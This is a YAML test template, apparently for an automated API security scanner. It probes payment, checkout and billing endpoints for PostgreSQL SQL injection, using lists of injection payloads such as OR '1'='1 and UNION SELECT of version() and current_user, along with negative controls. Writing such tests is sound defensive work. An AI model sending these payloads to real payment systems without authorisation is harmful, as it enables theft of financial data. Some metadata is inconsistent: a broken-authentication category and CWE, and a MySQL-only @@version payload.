id: PAYMENT_GATEWAY_SQL_INJECTION_POSTGRESQL
info:
  name: "SQL Injection test on Payment Gateway API for PostgreSQL"
  description: >
    "SQL Injection testing on a Payment Gateway API for PostgreSQL involves assessing vulnerabilities in the API's handling and processing of SQL queries. Attackers exploit these vulnerabilities by injecting malicious SQL commands through API parameters, aiming to compromise the PostgreSQL database behind the payment gateway. This test ensures the security of sensitive financial transactions by identifying and mitigating potential SQL injection risks in the API implementation."
  details: >
    "SQL Injection testing on a Payment Gateway API for PostgreSQL focuses on identifying and exploiting vulnerabilities in the API's input validation and SQL query handling mechanisms. Attackers attempt to inject SQL commands through API parameters, potentially gaining unauthorized access to sensitive payment information stored in the PostgreSQL database. Mitigating these vulnerabilities is crucial to ensuring the integrity and security of financial transactions processed through the payment gateway."
  impact: >
    "The impact of SQL Injection on a Payment Gateway API for PostgreSQL can be devastating, compromising the confidentiality and integrity of financial data. Successful exploitation could lead to unauthorized access to sensitive payment information, including credit card details and transaction records, stored in the PostgreSQL database. This can result in financial losses, fraudulent transactions, damage to customer trust, and regulatory penalties, highlighting the critical need for robust security measures and regular vulnerability assessments in payment processing systems."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: PAYMENT_GATEWAY_SQL_INJECTION_POSTGRESQL
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

settings:
  nature: INTRUSIVE
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  url:
    contains_either:
      - payment
      - transaction
      - checkout
      - purchase
      - billing
      - card
      - bank
      - amount
      - merchant
      - invoice
  request_payload:
    for_one:
      key:
        regex: ".*"
        extract: userKey
wordLists:
  paymentPayloads:
    - "12345' OR '1'='1 --"
    - "12345' UNION SELECT NULL, version(), NULL --"
    - "12345' UNION SELECT 1, current_database(), 3 --"
    - "100 OR 1=1 --"
    - "USD' UNION SELECT NULL, current_database(), NULL --"
    - "credit_card' OR '1'='1 --"
    - "4111111111111111' OR '1'='1 --"
    - "12 OR 1=1 --"
    - "2025' UNION SELECT NULL, current_database(), NULL --"
    - "123' UNION SELECT NULL, current_user, NULL --"
    - "4111111111111111' UNION SELECT NULL, @@version, NULL --"
    - "credit_card' UNION SELECT NULL, current_user, NULL --"
  paymentNegativePayloads:
    - "12345' OR '1'='1' AND '1'='0 --"
    - "12345' UNION SELECT NULL, version(), NULL WHERE 1=0 --"
    - "12345' UNION SELECT 1, current_database(), 3  WHERE 1=0 --"
    - "100 OR 1=1 AND 1-0 --"
    - "USD' UNION SELECT NULL, current_database(), NULL  WHERE 1=0 --"
    - "credit_card' OR '1'='1' AND '1'='0 --"
    - "4111111111111111' OR '1'='1  AND '1'='0 --"
    - "12 OR 1=1 AND 1=0 --"
    - "2025' UNION SELECT NULL, current_database(), NULL   WHERE 1=0 --"
    - "123' UNION SELECT NULL, current_user, NULL   WHERE 1=0 --"
    - "4111111111111111' UNION SELECT NULL, @@version, NULL   WHERE 1=0 --"
    - "credit_card' UNION SELECT NULL, current_user, NULL   WHERE 1=0 --"
execute:
  type: multiple
  requests:
    - req:
        - modify_body_param:
            userKey: ${paymentPayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              contains_either:
                - PostgreSQL
                - current_database
                - syntax
                - query
                - information_schema
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - UNION
                - SELECT
        - success: x2
        - failure: exit
    - req:
        - modify_body_param:
            userKey: ${paymentNegativePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0

              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - UNION
                - SELECT
                - PostgreSQL
                - current_database
                - syntax
                - query
                - information_schema
              neq: "${x1.response.body}"
        - success: vulnerable
        - failure: exit
